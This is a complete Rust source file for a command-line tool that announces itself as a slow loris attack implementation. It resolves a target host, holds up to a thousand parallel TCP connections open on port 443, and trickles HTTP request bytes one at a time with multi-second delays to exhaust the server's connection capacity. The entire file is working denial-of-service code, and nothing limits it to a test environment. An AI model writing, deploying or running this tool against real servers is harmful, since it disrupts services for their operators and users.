use std::io::Write;
use std::net::{IpAddr, TcpStream};
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::thread::{sleep, spawn};
use std::time::{Duration, Instant};

use console::Term;
use ctrlc;
use indicatif::{ProgressBar, ProgressStyle};
use rand::{Rng, thread_rng};
use rand::distributions::Alphanumeric;

fn main() {
    let args = parse_args();

    let host = args.host;
    let ip = args.ip;
    let connections = args.connections;
    let time_out_min = args.timeout_min;
    let time_out_max = args.timeout_max;
    let body_length_min = args.body_length_min;
    let body_length_max = args.body_length_max;

    let mut rng = thread_rng();
    let thread_counter = Arc::new(AtomicU64::new(0));
    let connection_counter = Arc::new(AtomicU64::new(0));
    // (total_response_time, total_responses)
    // total responses needs to be one to not divide by 0. This will average out over time
    let response_time = Arc::new((AtomicU64::new(0), AtomicU64::new(1)));

    let connection_bar = ProgressBar::new(connections)
        .with_style(ProgressStyle::default_bar()
            .template("Average response time: {msg} ms\nSending connections: {pos}/{len}\n{wide_bar}"));

    Term::stdout().hide_cursor().unwrap_or_else(|_| println!("Could not hide cursor"));
    Term::stdout().clear_screen().unwrap_or_else(|_| println!("\n\n"));

    ctrlc::set_handler(|| std::process::exit(0))
        .expect("Could not change ctrl-c behaviour");

    loop {
        let current_connections = connection_counter.load(Ordering::Relaxed);
        let time: u64 = response_time.0.load(Ordering::Relaxed);
        let responses: u64 = response_time.1.load(Ordering::Relaxed);
        let average_response_time = (time/responses).to_string();
        let current_threads = thread_counter.load(Ordering::Relaxed);

        connection_bar.set_position(current_connections);
        connection_bar.set_message(&average_response_time);

        if current_threads < connections {
            let thread_counter = Arc::clone(&thread_counter);
            let connection_counter = Arc::clone(&connection_counter);
            let average_time = Arc::clone(&response_time);

            let time_out = rng.gen_range(time_out_min, time_out_max);
            let body_length = rng.gen_range(body_length_min, body_length_max);
            let host = host.clone();

            thread_counter.fetch_add(1, Ordering::Relaxed);
            spawn(move || {
                new_socket(connection_counter, average_time, &host, ip, 443, time_out, body_length);
                thread_counter.fetch_sub(1, Ordering::Relaxed);
            });
        }
    }
}

struct Args {
    host: String,
    ip: IpAddr,
    connections: u64,
    timeout_min: u64,
    timeout_max: u64,
    body_length_min: usize,
    body_length_max: usize,

}

fn parse_args() -> Args {
    use dns_lookup::{lookup_host, lookup_addr};
    use clap::{App, Arg};

    fn validate_range(string: &str) -> Result<(), String> {
        if let Ok(_) = parse_range(&string) { Ok(()) } else { Err("takes values in the form of: <time> | <start>..<end> | <start>..=<end>".to_string()) }
    }

    let matches = App::new("Slow Loris")
        .about("A slow loris attack implementation in Rust")
        .author(clap::crate_authors!())
        .version(clap::crate_version!())
        .arg(Arg::with_name("address")
            .help("The address of the server\nCan either be an ip or a domain")
            .takes_value(true)
            .required(true)
        )
        .arg(Arg::with_name("connections")
            .help("The amount of connections established")
            .short("c")
            .long("connections")
            .takes_value(true)
            .default_value("1000")
            .validator(|connections| {
                if let Ok(_) = connections.parse::<u64>() { Ok(()) } else { Err("must be an unsigned integer".to_string()) }
            })
        )
        .arg(Arg::with_name("timeout")
            .help("specifies the timeout between each send byte in seconds\n\
            takes values in the form of: <time> | <start>..<end> | <start>..=<end>\n")
            .short("t")
            .long("timeout")
            .takes_value(true)
            .default_value("5..10")
            .validator(|timeout| validate_range(&timeout))
        )
        .arg(Arg::with_name("body_length")
            .help("specifies the body length of the request each connection sends\n\
            takes values in the form of: <length> | <start>..<end> | <start>..=<end>\n")
            .short("b")
            .long("body_length")
            .takes_value(true)
            .default_value("1100")
            .validator(|length| validate_range(&length))
        )
        .get_matches();

    let host;
    let ip;
    let address = matches.value_of("address").unwrap();
    match address.parse::<IpAddr>() {
        Ok(parsed) => {
            host = lookup_addr(&parsed)
                .expect("Could not find hostname for given ip");
            ip = parsed;
        }
        Err(_) => {
            host = address.to_string();
            ip = match lookup_host(address) {
                Ok(ips) if ips.len() == 1 => ips[0],
                _ => panic!("Could not find ip for given domain")
            }
        }
    }
    let connections = matches.value_of("connections").unwrap().parse().unwrap();
    let (timeout_min, timeout_max) = parse_range(matches.value_of("timeout").unwrap()).unwrap();
    let body_length = parse_range(matches.value_of("body_length").unwrap()).unwrap();
    let (body_length_min, body_length_max) = (body_length.0 as usize, body_length.1 as usize);


    Args {
        host,
        ip,
        connections,
        timeout_min,
        timeout_max,
        body_length_min,
        body_length_max,
    }
}

/// returns (<start_inclusive>, <end_exclusive>)
fn parse_range(string: &str) -> Result<(u64, u64), ()> {
    use regex::Regex;

    let ports_regex = Regex::new(r"^((?P<start>\d+)\.\.(?P<inclusive>=)?(?P<end>\d+)|(?P<single>\d+))$").unwrap();

    match ports_regex.captures(string) {
        Some(captures) => {
            if captures.name("single").is_some() {
                let single = captures.name("single").unwrap().as_str();
                let single: u64 = single.parse().unwrap();
                Ok((single, single + 1))
            } else {
                let start = captures.name("start").unwrap().as_str();
                let start: u64 = start.parse().unwrap();

                let end = captures.name("end").unwrap().as_str();
                let end: u64 = end.parse().unwrap();

                let inclusive = captures.name("inclusive").is_some();

                if inclusive {
                    Ok((start, end + 1))
                } else {
                    Ok((start, end))
                }
            }
        }
        None => Err(())
    }
}

fn new_socket(counter: Arc<AtomicU64>, average_time: Arc<(AtomicU64, AtomicU64)>, host: &str, ip: IpAddr, port: u16, time_out: u64, body_length: usize) {
    let start = Instant::now();

    let mut connection = match TcpStream::connect((ip, port)) {
        Ok(connection) => {
            let time = Instant::now().duration_since(start).as_millis() as u64;

            counter.fetch_add(1, Ordering::Relaxed);
            average_time.0.fetch_add(time, Ordering::Relaxed);
            average_time.1.fetch_add(1, Ordering::Relaxed);

            connection
        }
        Err(_) => return
    };

    let time_out = Duration::from_secs(time_out);

    let request = http_request(host, body_length);
    for c in request.as_bytes() {
        match connection.write_all(&[*c]) {
            Ok(_) => {}
            Err(_) => {
                counter.fetch_sub(1, Ordering::Relaxed);
                return;
            }
        }
        sleep(time_out);
    }
    counter.fetch_sub(1, Ordering::Relaxed);
}

fn http_request(host: &str, body_length: usize) -> String {
    format!("{}{}", http_header(host), http_body(body_length))
}

fn http_header(host: &str) -> String {
    format!("\
    GET / HTTP/1.1\n\
    Host: {}\n\
    Content-Type: application/x-www-form-urlencoded\n\
    Accept: text/html,application/xhtml+xml,application/xml; q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange; v=b3; q=0.9\n\
    Connection: keep-alive\n\
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0\n\
    Accept-Encoding: gzip, deflate, br\n\
    Accept-Language: en-US,en;q=0.9,en-UK;q=0.8,en;q=0.7,fr;q=0.6\n\
    ", host)
}

fn http_body(length: usize) -> String {
    let lines = length / 11;
    let rest = length % 11;
    let mut string = String::new();

    for _ in 0..lines {
        string.push_str(&rand_string(5));
        string.push('=');
        string.push_str(&rand_string(5));
    }
    string.push_str(&rand_string(rest));

    string
}

fn rand_string(length: usize) -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .collect::<String>()
}


